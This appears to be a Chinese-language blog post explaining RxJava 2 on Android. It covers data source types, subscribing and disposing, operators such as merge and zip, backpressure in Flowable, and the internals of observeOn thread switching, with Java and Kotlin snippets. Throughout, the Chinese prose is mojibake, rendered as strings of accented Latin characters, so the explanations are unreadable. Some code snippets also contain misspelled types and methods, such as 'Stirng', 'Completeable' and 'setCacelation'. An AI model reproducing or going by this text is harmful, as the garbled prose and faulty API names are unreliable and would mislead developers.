Reactive?æœ€æ—©ä½¿ç”¨Rxjavaçš„åˆè¡·åœ¨äºæ–¹ä¾¿åœ°å®ç°çº¿ç¨‹åˆ‡æ¢ï¼Œä½¿ç”¨é“¾å¼è¯­æ³•è½»æ¾åœ°å°†å¼‚æ­¥ä»»åŠ¡åˆ†å‘åˆ°å­çº¿ç¨‹å¹¶çœå»äº†ä¸»åŠ¨å®ç°å›è°ƒçš„éº»çƒ¦ã€‚æˆ‘ä»¬ç”Ÿæ´»åœ¨ä¸€ä¸ªäº‹ä»¶å¼‚æ­¥åˆ†å‘çš„ç¯å¢ƒä¸­ï¼Œç½‘ç»œï¼Œæ–‡ä»¶ã€ç”šè‡³ç”¨æˆ·è¾“å…¥æœ¬èº«ä¹Ÿæ˜¯å¼‚æ­¥äº‹ä»¶ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå®‰å“ç³»ç»Ÿæœ¬èº«çš„è®¸å¤šæ“ä½œä¹Ÿæ˜¯å¼‚æ­¥çš„ï¼Œä¾‹å¦‚startActivityï¼ŒFragmentçš„transactionï¼Œè¿™å°±è¦æ±‚å¼€å‘è€…ä¸å¾—ä¸è€ƒè™‘å„ç§äº‹ä»¶çŠ¶æ€ï¼Œå¹¶åœ¨å„ç§äº‹ä»¶ä¹‹é—´è¿›è¡Œåè°ƒã€‚Rxjavaå°†å„ç§äº‹ä»¶çš„å¤„ç†ã€å®Œæˆä»¥åŠå¼‚å¸¸åœ¨äº‹ä»¶å®šä¹‰ä¹‹åˆå®šä¹‰å¥½å¤„ç†æ–¹å¼ã€‚äº‹ä»¶çš„å¼€å§‹ï¼Œè¿›è¡Œï¼Œå®Œæˆä»¥åŠå¼‚å¸¸ï¼Œéƒ½è¢«æŠ½è±¡åˆ°Observableçš„è½½ä½“ä¸­ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é“¾å¼è°ƒç”¨å¾ˆåƒBuilder Patternï¼Œä½†æœ¬è´¨ä¸Šæ¯ä¸€æ­¥éƒ½ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚è¿™ä¸ªåœ¨Rxjavaçš„Wikiä¸Šæœ‰æ‰€è¯´æ˜ï¼Œå³æ¯ä¸€æ­¥éƒ½ç”Ÿæˆä¸€ä¸ªæ–°çš„immutable objectï¼ˆGCè¡¨ç¤ºå‹åŠ›å¤§ï¼‰ã€‚ 2. æ•°æ®æºStreamåŸºæœ¬åŒ…æ‹¬è¿™ä¸‰éƒ¨åˆ† source of data listener of data methods for modifying data 2.1 æ•°æ®æºçš„ç§ç±»Observable å’ŒFlowableï¼ŒåŒºåˆ«åœ¨äºåè€…æ”¯æŒBackPressureï¼Œåè€…ä¸æ”¯æŒBackPressure.æ¥æ”¶Observableå’ŒFlowableçš„ç±»å‹åˆ†åˆ«ä¸ºObserverå’ŒSubscriber interface Observer&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Disposable d); } interface Disposable{ void dispose(); } interface Subscriber&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Subscription s); } interface Subscription{ void cancel(); //ç”¨äºå–æ¶ˆè®¢é˜…ï¼Œé‡Šæ”¾èµ„æº void request(long r) ;//è¯·æ±‚æ›´å¤šçš„æ•°æ®ï¼Œå³BackPressureå¼€å§‹ä½“ç°çš„åœ°æ–¹ } ä¸¤è€…çš„åŒºåˆ«åœ¨äºæœ€åä¸€ä¸ªæ–¹æ³•ï¼Œä»¥Disposableä¸ºä¾‹ï¼Œå½“ä½ å¼€å§‹subscribeä¸€ä¸ªæ•°æ®æºçš„æ—¶ï¼Œå°±ç±»ä¼¼äºåˆ›å»ºäº†ä¸€ä¸ªResurceï¼Œè€ŒResourceæ˜¯å¾€å¾€éœ€è¦åœ¨ç”¨å®Œä¹‹ååŠæ—¶é‡Šæ”¾ã€‚æ— è®ºæ˜¯Observableè¿˜æ˜¯Flowable,è¿™ä¸ªonSubscribeæ–¹æ³•ä¼šåœ¨è®¢é˜…åç«‹å³è¢«è°ƒç”¨ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œçš„Disposableå¯ä»¥ä¿ç•™ä¸‹æ¥ï¼Œåœ¨å¿…è¦æ—¶å€™ç”¨äºé‡Šæ”¾èµ„æºã€‚å¦‚Activityçš„onDestroyä¸­cancel network request. 2.2 æ•°æ®æºçš„å¯¹åº”ç±»Single (è®¢é˜…ä¸€ä¸ªSingleï¼Œè¦ä¹ˆè·å¾—ä»…ä¸€ä¸ªè¿”å›å€¼ï¼Œè¦ä¹ˆå‡ºç°å¼‚å¸¸è¿”å›Error) public abstract class Single&lt;T&gt; implements SingleSource&lt;T&gt; {} Completeable (è®¢é˜…ä¸€ä¸ªcompleteableï¼Œè¦ä¹ˆæˆåŠŸï¼Œä¸è¿”å›å€¼ï¼Œè¦ä¹ˆå‡ºç°å¼‚å¸¸è¿”å›errorï¼Œå°±åƒä¸€ä¸ªreactive runnaleï¼Œä¸€ä¸ªå¯ä»¥æ‰§è¡Œçš„commandï¼Œå¹¶ä¸è¿”å›ç»“æœ) public abstract class Completable implements CompletableSource {} ä¾‹å¦‚ï¼Œå¼‚æ­¥å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œè¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆå‡ºç°errorï¼Œå¹¶ä¸éœ€è¦è¿”å›ä»€ä¹ˆã€‚ public void writeFile(Stirng data){} // å°±å¯ä»¥modelæˆ Completeable writeFile(Stirng data){} Maybe (æœ‰å¯èƒ½è¿”å›å€¼ï¼Œæœ‰å¯èƒ½ä¸è¿”å›ï¼Œä¹Ÿæœ‰å¯èƒ½å¼‚å¸¸ï¼Œå³optional) public abstract class Maybe&lt;T&gt; implements MaybeSource&lt;T&gt; {} ä»¥ä¸Šä¸‰ç§æ•°æ®æºéƒ½æœ‰staticæ–¹æ³•ç”Ÿæˆï¼šä¾‹å¦‚ æ¯”è¾ƒæ¨èçš„æ–¹æ³•æœ‰ä¸¤ç§ ä¸€. fromCallableObservable.fromCallable(new Callable&lt;String&gt;(){ @override public String call() throw Exception{ return getName() // ä¹‹å‰æ˜¯synchroniousçš„getï¼Œç°åœ¨è¿™ä¸€æ­¥å¯ä»¥asynchnousæ‰§è¡Œ,æ¯”å¦‚æ”¾ä¸€ä¸ªOkHttpClient.newCall(request).execute(); //å› ä¸ºæ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œä¹Ÿä¸å­˜åœ¨æ€§èƒ½é—®é¢˜ } }) ä¸Šé¢è¿™æ®µä¸­çš„callæ–¹æ³•ä¼šåœ¨è¢«è®¢é˜…åæ‰§è¡Œï¼ŒæˆåŠŸçš„è¯ä¼šèµ°åˆ°observerçš„onNextï¼Œå¤±è´¥çš„è¯ä¼šèµ°åˆ°onErrorã€‚fromCallableå¯ç”¨äºå„ç§æ•°æ®æºï¼ŒåŒ…æ‹¬Flowable Flowable.fromCallable(() -&gt; &quot;Hello Flowable&quot;); Observable.fromCallable(() -&gt; &quot;Hello Observable&quot;); Maybe.fromCallable(() -&gt; &quot;Hello Maybe&quot;); Single.fromCallable(() -&gt; &quot;Hello Single&quot;); Completeable.fromCallable(() -&gt; &quot;Hello Completeable&quot;); fromCallable are for modeling synchronous sourse of a single source of data. å¾ˆå¤šéœ€è¦è¿”å›å€¼çš„æ–¹æ³•éƒ½å¯ä»¥æŠ½è±¡æˆè¿™ç§æ–¹æ³•ã€‚Maybeå’ŒCompleteableè¿˜æœ‰ä¸¤ä¸ªæ–¹æ³•,ç”¨äºè¡¨ç¤ºä¸è¿”å›æ•°æ®çš„æ–¹æ³• Maybe.fromAction(() -&gt; &quot;Hey jude&quot;) Maybe.fromRunnable(() -&gt; &quot;ignore&quot;) Completeable.fromAction(() -&gt; &quot;Hey jude&quot;) Completeable.fromRunnable(() -&gt; &quot;ignore&quot;) äºŒ. create(Rxjava 1ä¸­ä¸æ¨èä½¿ç”¨è¯¥æ–¹æ³•ï¼ŒRxjava2ä¸­å»ºè®®ä½¿ç”¨)Observable.create(new ObservableOnSubscribe&lt;String&gt;()){ @override public void subscribe (ObservableEmitter&lt;String&gt; e) throws Exception{ //subscribe get called whenever there&#39;s a new subscriber, emitter is the person that&#39;s listening. // e.onNext(&quot;Hello&quot;); e.onComplete(); } } ä¸€ä¸ªObservableå¯ä»¥æœ‰å¤šä¸ªsubscriberã€‚ä¸€ä¸ªè¢«è§‚å¯Ÿè€…å¯ä»¥æœ‰å¤šä¸ªè§‚å¯Ÿè€…ï¼Œè¢«è§‚å¯Ÿè€…çš„onNextè°ƒç”¨ï¼Œè§‚å¯Ÿè€…çš„onNextä¹Ÿä¼šè¢«è°ƒç”¨ lambdaæ›´ç®€æ´ Observable.create(e -&gt;{ e.onNext(&quot;Hello&quot;); e.onNext(&quot;Hello&quot;); e.onComplete(); }) Okhttpçš„å¼‚æ­¥ç½‘ç»œè¯·æ±‚ä¹Ÿå¯ä»¥modelæˆä¸€ç§è¢«è§‚å¯Ÿçš„æµ Observable.create(e -&gt;{ Call call = client.newCall(request); call.enqueue(new Callback()){ @Override public void onResponse(Response r) throws IOException{ e.onNext(r.body().toString()); e.onComplete(); } @Override public void onFailure(IOException e){ e.onError(e); } } }) //é‡ç‚¹äº†æ¥äº†ï¼Œ public interface ObservableEmitter&lt;T&gt; extends Emitter&lt;T&gt; { /** * Sets a Cancellable on this emitter; any previous Disposable * or Cancellation will be unsubscribed/cancelled. * @param c the cancellable resource, null is allowed */ void setCancellable(Cancellable c); } // emitterå¯ä»¥è®¾ç½®cancelçš„åŠ¨ä½œ Observable.create(e -&gt;{ e.setCacelation(() -view.setOnClickListener(null)); view.setOnClickListener(v -&gt; e.onNext()); }) // ç‚¹å‡»æŒ‰é’®å‘é€äº‹ä»¶ï¼Œå–æ¶ˆè®¢é˜…æ—¶é¿å…leak View // å’ŒfromCallableä¸€æ ·ï¼Œcreateæ–¹æ³•ä¹Ÿé€‚ç”¨äºæ‰€æœ‰äº”ç§data source 3. å¦‚ä½•è®¢é˜…ï¼ˆæ¥æ”¶ï¼‰è¿™äº›æ•°æ®3.1 observerå’ŒSubscriberæ¥æ”¶Observableå’ŒFlowableçš„ç±»å‹åˆ†åˆ«ä¸ºObserverå’ŒSubscriber interface Observer&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Disposable d); } interface Disposable{ void dispose(); } interface Subscriber&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Subscription s); } interface Subscription{ void cancel(); //ç”¨äºå–æ¶ˆè®¢é˜…ï¼Œé‡Šæ”¾èµ„æº void request(long r) ;//è¯·æ±‚æ›´å¤šçš„æ•°æ®ï¼Œå³BackPressureå¼€å§‹ä½“ç°çš„åœ°æ–¹ } æ‰€ä»¥æ•´ä½“æ¥çœ‹ï¼Œæ•°æ®çš„æµå‘å°±è¿™ä¹ˆä¸¤ç§ï¼Œå·¦è¾¹å‘é€æ•°æ®(å¯èƒ½åªæœ‰ä¸€ä¸ªï¼Œå¯èƒ½é—´æ­‡æ€§çš„ï¼Œå¯èƒ½ä¸€ç›´ä¸åœ)ï¼Œäº‹ä»¶é€šè¿‡æ•°æ®æµä¼ è¾“åˆ°å³è¾¹ï¼Œå³è¾¹æ ¹æ®åè®®ä½œå‡ºç›¸åº”(Reactive)Observable -&gt; subscribe -&gt; Observer Flowable -&gt; subscribe -&gt; Subscription 3.2 onSubscribeæ€ä¹ˆç”¨é€šå¸¸ä¸ç›´æ¥ç”¨è¿™ä¸¤ç§base classï¼Œå› ä¸ºç¬¬å››ä¸ªæ–¹æ³•ä¸çŸ¥é“æ€ä¹ˆç”¨å˜›ã€‚ Observable.just(&quot;Hello&quot;).subscribe(new DisposableObserver&lt;String&gt;() { @Override public void onNext(String value) { } @Override public void onError(Throwable e) { } @Override public void onComplete() { } }); // å¯ä»¥æŒæœ‰DisposableObserverï¼Œåœ¨åœæ­¢è®¢é˜…çš„æ—¶å€™è°ƒç”¨observer.disposeæ–¹æ³•ï¼Œåˆ‡æ–­æµã€‚ // æˆ–è€…è¿™æ · Disposable disposable = Observable.just(&quot;Hello&quot;).subscribeWith(new DisposableObserver&lt;String&gt;() { @Override public void onNext(String value) { } @Override public void onError(Throwable e) { } @Override public void onComplete() { } }); // subscribeWithè¿”å›ä¸€ä¸ªDisposableï¼Œsubscribeæ˜¯ä¸€ä¸ªæ²¡æœ‰è¿”å›å€¼çš„å‡½æ•° // å·æ‡’ä¸€ç‚¹çš„è¯ï¼Œé€šå¸¸æŠŠè¿™äº›è¿”å›çš„è®¢é˜…åŠ å…¥åˆ°ä¸€ä¸ªCompositeDisposable,åœ¨onDestroyçš„æ—¶å€™ç»Ÿä¸€å–æ¶ˆè®¢é˜…å³å¯ // Observableã€Singleã€Completeableã€Maybeä»¥åŠFlowableéƒ½æ”¯æŒsubscribewithã€‚ 4. æ•°æ®æºå’Œæ¥å—è€…å»ºç«‹è”ç³» Observable.subscribeæˆ–è€…Flowable.subscribeæˆ–è€…ä½¿ç”¨ä¹‹å‰æåˆ°çš„sbscribeWithæˆ‘å°è¯•å†™äº†ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„è°ƒç”¨é¡ºåº`javaObservable.fromCallable(new Callable&lt;List&gt;() { @Override public List call() throws Exception { LogUtil.p(â€œcall do on thread anyâ€); blockThread(2000); // block 2s return Arrays.asList(array); } }).subscribeOn(Schedulers.computation()) .observeOn(AndroidSchedulers.mainThread()) .doOnSubscribe(new Consumer() { @Override public void accept(Disposable disposable) throws Exception { LogUtil.p(â€œâ€); } }).doOnComplete(new Action() { @Override public void run() throws Exception { LogUtil.p(â€œâ€); } }).doOnNext(new Consumer&lt;List&gt;() { @Override public void accept(List strings) throws Exception { LogUtil.p(â€œâ€ + strings.get(0)); } }).doAfterNext(new Consumer&lt;List&gt;() { @Override public void accept(List strings) throws Exception { LogUtil.p(â€œâ€+strings.get(0)); } }).subscribe(new Observer&lt;List&gt;() { @Override public void onSubscribe(Disposable d) { LogUtil.p(â€œonSubscribe â€œ + d.isDisposed()); } @Override public void onNext(List&lt;String&gt; value) { LogUtil.p(&quot; get Response &quot; + value.size()); value.set(0, &quot;change first element!&quot;); } @Override public void onError(Throwable e) { } @Override public void onComplete() { LogUtil.p(&quot;&quot;); } }); // æ‰§è¡Œé¡ºåºï¼šï¼ˆæ‹¬å·å†…æ•°å­—è¡¨ç¤ºçº¿ç¨‹idï¼‰// doOnsubscribe(1) -&gt; onSubscribe(1) -&gt; call(276) -&gt;doOnNext(1)-&gt;onNext(1) -&gt; doAfterNext(1) -&gt;doOnComplete(1)-&gt;onComplete(1)// æ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥è®¤ä¸ºdoOnXXX= doBeforeXXX,çº¿ç¨‹éƒ½æ˜¯ä¸€æ ·çš„ã€‚ä¼°è®¡æ˜¯ä¸ºäº†æ‰“æ—¥å¿—ç”¨çš„ï¼Œæˆ–è€…è¯´ç”¨äºåˆ‡ç‰‡ã€‚// åƒæäº†OkHttpçš„interecpteræˆ–æ˜¯gradleçš„taskã€‚ ## 5. Operator and Threading ```java Observable&lt;String&gt; greeting = Observable.just(&quot;Hello&quot;); Observable&lt;String&gt; yelling = greeting.map(s -&gt;s.toUppercase()) Observable.subscribeOn(Schedulers.io()) // subscribeOnå†³å®šäº†taskåœ¨å“ªæ¡çº¿ç¨‹ä¸Šè¿è¡Œï¼Œæ“ä½œç¬¦çš„é¡ºåºå¾ˆé‡è¦this is wrong this is right æµä¹‹é—´çš„è½¬æ¢ Observable -&gt; first() -&gt; singleObservable -&gt; firstElement -&gt; MaybeObservable -&gt; ignoreElements() -&gt;Completable Flowable -&gt; first() -&gt; singleFlowable -&gt; firstElement -&gt; MaybeFlowable -&gt; ignoreElements() -&gt;Completable Combining Observables å¤šä¸ªæ•°æ®æ¥æºçš„åŠ å·¥ updates: å¤åˆ¶ä¸€äº›å®ä¾‹merge(): // ç”¨äºå­˜æ”¾æœ€ç»ˆå±•ç¤ºçš„æ•°æ® String result = &quot;æ•°æ®æºæ¥è‡ª = &quot; ; /* * è®¾ç½®ç¬¬1ä¸ªObservableï¼šé€šè¿‡ç½‘ç»œè·å–æ•°æ® * æ­¤å¤„ä»…ä½œç½‘ç»œè¯·æ±‚çš„æ¨¡æ‹Ÿ **/ Observable&lt;String&gt; network = Observable.just(&quot;ç½‘ç»œ&quot;); /* * è®¾ç½®ç¬¬2ä¸ªObservableï¼šé€šè¿‡æœ¬åœ°æ–‡ä»¶è·å–æ•°æ® * æ­¤å¤„ä»…ä½œæœ¬åœ°æ–‡ä»¶è¯·æ±‚çš„æ¨¡æ‹Ÿ **/ Observable&lt;String&gt; file = Observable.just(&quot;æœ¬åœ°æ–‡ä»¶&quot;); /* * é€šè¿‡mergeï¼ˆï¼‰åˆå¹¶äº‹ä»¶ &amp; åŒæ—¶å‘é€äº‹ä»¶ **/ Observable.merge(network, file) .subscribe(new Observer&lt;String&gt;() { @Override public void onSubscribe(Disposable d) { } @Override public void onNext(String value) { Log.d(TAG, &quot;æ•°æ®æºæœ‰ï¼š &quot;+ value ); result += value + &quot;+&quot;; } @Override public void onError(Throwable e) { Log.d(TAG, &quot;å¯¹Erroräº‹ä»¶ä½œå‡ºå“åº”&quot;); } // æ¥æ”¶åˆå¹¶äº‹ä»¶åï¼Œç»Ÿä¸€å±•ç¤º @Override public void onComplete() { Log.d(TAG, &quot;è·å–æ•°æ®å®Œæˆ&quot;); Log.d(TAG, result ); } }); zip() ï¼Œæ¯”å¦‚è¦åŒæ—¶æ‹‰ä¸¤ä¸ªæ¥å£ public class MainActivity extends AppCompatActivity { private static final String TAG = &quot;Rxjava&quot;; // å®šä¹‰Observableæ¥å£ç±»å‹çš„ç½‘ç»œè¯·æ±‚å¯¹è±¡ Observable&lt;Translation1&gt; observable1; Observable&lt;Translation2&gt; observable2; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // æ­¥éª¤1ï¼šåˆ›å»ºRetrofitå¯¹è±¡ Retrofit retrofit = new Retrofit.Builder() .baseUrl(&quot;http://fy.iciba.com/&quot;) // è®¾ç½® ç½‘ç»œè¯·æ±‚ Url .addConverterFactory(GsonConverterFactory.create()) //è®¾ç½®ä½¿ç”¨Gsonè§£æ(è®°å¾—åŠ å…¥ä¾èµ–) .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) // æ”¯æŒRxJava .build(); // æ­¥éª¤2ï¼šåˆ›å»º ç½‘ç»œè¯·æ±‚æ¥å£ çš„å®ä¾‹ GetRequest_Interface request = retrofit.create(GetRequest_Interface.class); // æ­¥éª¤3ï¼šé‡‡ç”¨Observable&lt;...&gt;å½¢å¼ å¯¹ 2ä¸ªç½‘ç»œè¯·æ±‚ è¿›è¡Œå°è£… observable1 = request.getCall().subscribeOn(Schedulers.io()); // æ–°å¼€çº¿ç¨‹è¿›è¡Œç½‘ç»œè¯·æ±‚1 observable2 = request.getCall_2().subscribeOn(Schedulers.io());// æ–°å¼€çº¿ç¨‹è¿›è¡Œç½‘ç»œè¯·æ±‚2 // å³2ä¸ªç½‘ç»œè¯·æ±‚å¼‚æ­¥ &amp; åŒæ—¶å‘é€ // æ­¥éª¤4ï¼šé€šè¿‡ä½¿ç”¨Zipï¼ˆï¼‰å¯¹ä¸¤ä¸ªç½‘ç»œè¯·æ±‚è¿›è¡Œåˆå¹¶å†å‘é€ Observable.zip(observable1, observable2, new BiFunction&lt;Translation1, Translation2, String&gt;() { // æ³¨ï¼šåˆ›å»ºBiFunctionå¯¹è±¡ä¼ å…¥çš„ç¬¬3ä¸ªå‚æ•° = åˆå¹¶åæ•°æ®çš„æ•°æ®ç±»å‹ @Override public String apply(Translation1 translation1, Translation2 translation2) throws Exception { return translation1.show() + &quot; &amp; &quot; +translation2.show(); } }).observeOn(AndroidSchedulers.mainThread()) // åœ¨ä¸»çº¿ç¨‹æ¥æ”¶ &amp; å¤„ç†æ•°æ® .subscribe(new Consumer&lt;String&gt;() { // æˆåŠŸè¿”å›æ•°æ®æ—¶è°ƒç”¨ @Override public void accept(String combine_infro) throws Exception { // ç»“åˆæ˜¾ç¤º2ä¸ªç½‘ç»œè¯·æ±‚çš„æ•°æ®ç»“æœ Log.d(TAG, &quot;æœ€ç»ˆæ¥æ”¶åˆ°çš„æ•°æ®æ˜¯ï¼š&quot; + combine_infro); } }, new Consumer&lt;Throwable&gt;() { // ç½‘ç»œè¯·æ±‚é”™è¯¯æ—¶è°ƒç”¨ @Override public void accept(Throwable throwable) throws Exception { System.out.println(&quot;ç™»å½•å¤±è´¥&quot;); } }); } } replayæ“ä½œç¬¦ï¼šä¸€ä¸ªsourceå…ˆåˆ›å»ºï¼Œå‘é€äº†3ä¸ªäº‹ä»¶åï¼Œæœ‰ä¸€ä¸ªsubscriberæ‰å¼€å§‹subscribeï¼Œè¿™æ—¶ä¼šæŠŠä¹‹å‰çš„3ä¸ªäº‹ä»¶å’Œä¹‹åçš„é™†ç»­äº‹ä»¶éƒ½ä¸¢ç»™subscriberã€‚ é“¾å¼è°ƒç”¨æ¯ä¸€æ­¥éƒ½ç”Ÿæˆäº†æ–°çš„objectï¼ŒRxjava2å’ŒRxjava1ç›¸æ¯”ï¼Œå¯¹GCæ›´åŠ å‹å¥½ã€‚quote:RxJava 2 is not something new. Reactive programming is not new by any stretch, but Android itself is a highly reactive world that weâ€™ve been taught to model in a very imperative, stateful fashion.Reactive programming allow us to model it in the proper way: asynchronously. Embrace the asynchronicity of the sources, and instead of trying to manage all the state ourselves, compose them together such that our apps become truly reactive. updates:How about Error Handling ?Error handling in RxJava Rxjava2ä¸­çš„Subscriberæ˜¯éµå¾ªreactive streamè¿™ä¸ªé¡¹ç›®ä¸­çš„è§„èŒƒçš„ï¼Œåè€…æä¾›äº†backpressureæ”¯æŒobservable(äº‹å®ä¸Šæ˜¯observableSource) -&gt; observerFlowable(publisheræ¥å£) -&gt; Subscriberwhat-is-the-difference-between-an-observer-and-a-subscriber javaè¿˜æœ‰è¿™ç§å†™æ³• PublishSubject.&lt;T&gt;create() Flowableä¸­é»˜è®¤çš„bufferSizeæ˜¯128ï¼Œè¿™ä¸ªæ˜¯åœ¨æºç ä¸­å®šä¹‰çš„:Flowable.bufferSize()æ–¹æ³•é»˜è®¤è¿”å›çš„å°±æ˜¯128 MissingBackpressureExceptionå’ŒBufferOverFlowExceptionåº”è¯¥æ˜¯ä¸ä¸€æ ·çš„ åœ¨ç›¸åŒçš„ä¸€æ¡çº¿ç¨‹ä¸­ï¼Œæ˜¯ä¸å­˜åœ¨èƒŒå‹çš„é—®é¢˜çš„ï¼Œä¸åŒçº¿ç¨‹ä¹‹é—´çš„æ¶ˆè´¹è€…å’Œç”Ÿäº§è€…ä¹‹é—´å¯èƒ½äº§ç”ŸèƒŒå‹é—®é¢˜ã€‚å°±ç®—æ¶ˆè´¹è€…çº¿ç¨‹ä¸­ä¸å†™Thread.sleep()ä¹Ÿæ˜¯æœ‰å¯èƒ½å‡ºç°MissingBackPressureExceptionã€‚ Flowableè¿™ç§ç›´æ¥éµå¾ªä¸Šæ¸¸å“åº”ä¸‹æ¸¸requestè¯·æ±‚æ‰å‘é€æ•°æ® var sp5:Subscription?= null btn5.setOnClickListener { Flowable.create&lt;String&gt;({emitter -&gt; for(i in 0..1000){ emitter.onNext(i.toString()) LogUtil.e(TAG,&quot;send down message $i&quot;) } emitter.onComplete() },BackpressureStrategy.BUFFER) .subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()) .subscribe(object :FlowableSubscriber&lt;String&gt;{ override fun onComplete() { LogUtil.e(TAG,&quot;OnComplete called &quot;) } override fun onSubscribe(s: Subscription) { sp5 = s sp5?.request(1) } override fun onNext(t: String?) { LogUtil.e(TAG,&quot;receive message $t&quot;) Thread.sleep(100) sp5?.request(1) } override fun onError(t: Throwable?) { LogUtil.e(TAG,t?.message) } }) } Flowable.fromPublisher()æ–¹æ³•æ¥å—ä¸€ä¸ªPublisherå‚æ•°ï¼Œä½†æ˜¯ä½†æ˜¯ä½†æ˜¯ Note that even though Publisher appears to be a functional interface, it is not recommended to implement it through a lambda as the specification requires state management that is not achievable with a stateless lambda. rxjavaçº¿ç¨‹åˆ‡æ¢çš„åŸç†çº¿ç¨‹åˆ‡æ¢çš„åŸç†ä»¥åŠsubscribeOnåªèƒ½ç”¨ä¸€æ¬¡çš„åŸå› Observable.observeOn() @CheckReturnValue @SchedulerSupport(SchedulerSupport.CUSTOM) public final Observable&lt;T&gt; observeOn(Scheduler scheduler, boolean delayError, int bufferSize) { ObjectHelper.requireNonNull(scheduler, &quot;scheduler is null&quot;); ObjectHelper.verifyPositive(bufferSize, &quot;bufferSize&quot;); return RxJavaPlugins.onAssembly(new ObservableObserveOn&lt;T&gt;(this, scheduler, delayError, bufferSize)); } observeOnæ–¹æ³•å®é™…è¿”å›äº†ä¸€ä¸ªObservableObserveOnå®ä¾‹ã€‚å¤–éƒ¨è°ƒç”¨subscribe -&gt; ObservableObserveOn.subScribeActual -&gt; ä¸Šæ¸¸source.subscribe(new ObserveOnObserver(observer, w, delayError, bufferSize))ï¼Œè¿™ä¸ªobserveræ˜¯å¤–éƒ¨è°ƒç”¨è€…å†™çš„ï¼Œç­‰äºè¯´è¿™ä¸ªObserveOnObserveræ˜¯ä¸Šæ¸¸ï¼ˆactualï¼‰å’Œä¸‹æ¸¸(å¼€å‘è€…å†™çš„observer)ä¹‹é—´çš„æ¡¥æ¢ï¼Œåœ¨æ”¶åˆ°ä¸Šæ¸¸onNextçš„æ—¶å€™ä¼šæœ€ç»ˆèµ°åˆ°NewThreadWorker.scheduleDirect @NonNull public ScheduledRunnable scheduleActual(final Runnable run, long delayTime, @NonNull TimeUnit unit, @Nullable DisposableContainer parent) { // ... ScheduledRunnable sr = new ScheduledRunnable(decoratedRun, parent); Future&lt;?&gt; f; try { if (delayTime &lt;= 0) { f = executor.submit((Callable&lt;Object&gt;)sr); } else { f = executor.schedule((Callable&lt;Object&gt;)sr, delayTime, unit); } sr.setFuture(f); } catch (RejectedExecutionException ex) { //.... } return sr; } è¿”å›äº†ä¸€ä¸ªScheduledRunnable,é‡Œé¢åŒ…è£…äº†ä¸€ä¸ªFutureã€‚å¾€executoræäº¤äº†taskä¹‹åï¼Œtaskçš„runæ–¹æ³•å°†è¢«æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ScheduledRunnableçš„runæ–¹æ³• @Override public void run() { lazySet(THREAD_INDEX, Thread.currentThread()); try { try { actual.run(); } catch (Throwable e) { // Exceptions.throwIfFatal(e); nowhere to go RxJavaPlugins.onError(e); } } finally { //... if (o != PARENT_DISPOSED &amp;&amp; compareAndSet(PARENT_INDEX, o, DONE) &amp;&amp; o != null) { ((DisposableContainer)o).delete(this); } for (;;) { o = get(FUTURE_INDEX); if (o == SYNC_DISPOSED || o == ASYNC_DISPOSED || compareAndSet(FUTURE_INDEX, o, DONE)) { break;//åˆ¤æ–­å½“å‰å¤„äºDONEçš„çŠ¶æ€çš„è¯å°±å¯ä»¥è·³å‡ºå¾ªç¯ } } } } å›å¤´çœ‹ObserveOnObserver çš„åˆ›å»ºï¼Œ new ObservableObserveOn&lt;T&gt;(this, scheduler, delayError, bufferSize));//è¿™ä¸ªthisæ˜¯Observable æ¥ä¸‹æ¥å¼€å§‹subScribe -&gt; subScribeActual @Override protected void subscribeActual(Observer&lt;? super T&gt; observer) { if (scheduler instanceof TrampolineScheduler) { source.subscribe(observer); } else { Scheduler.Worker w = scheduler.createWorker(); source.subscribe(new ObserveOnObserver&lt;T&gt;(observer, w, delayError, bufferSize)); //è¿™ä¸ªsourceå°±æ˜¯ä¸Šé¢çš„Observableã€‚è¿™ä¸ªObserveOnObserverå°±åƒæˆ‘ä»¬å¹³æ—¶å†™çš„Observerä¸€æ ·ï¼Œæœ‰onNext,onComplete,onErrorç­‰ } } //ä¸‹é¢æ˜¯ObserveOnObserverçš„æ„é€ å‡½æ•° ObserveOnObserver(Observer&lt;? super T&gt; actual, Scheduler.Worker worker, boolean delayError, int bufferSize) { this.actual = actual; this.worker = worker; this.delayError = delayError; this.bufferSize = bufferSize; } @Override public void onNext(T t) { if (done) { return; } if (sourceMode != QueueDisposable.ASYNC) { queue.offer(t); //è¿™é‡Œï¼ŒæŠŠä¸Šæ¸¸çš„æ•°æ®å­˜è¿›queue } schedule(); } void schedule() { if (getAndIncrement() == 0) { worker.schedule(this); //æ˜¾ç„¶è¿™ä¸ªthisæ˜¯ä¸€ä¸ªrunnable } } @Override public void run() { if (outputFused) { drainFused(); } else { drainNormal(); } } //ä¸€ä¸ªforå¾ªç¯ void drainNormal() { // for (;;) { boolean d = done; T v; try { v = q.poll(); } catch (Throwable ex) { // .. } //.. a.onNext(v); } } 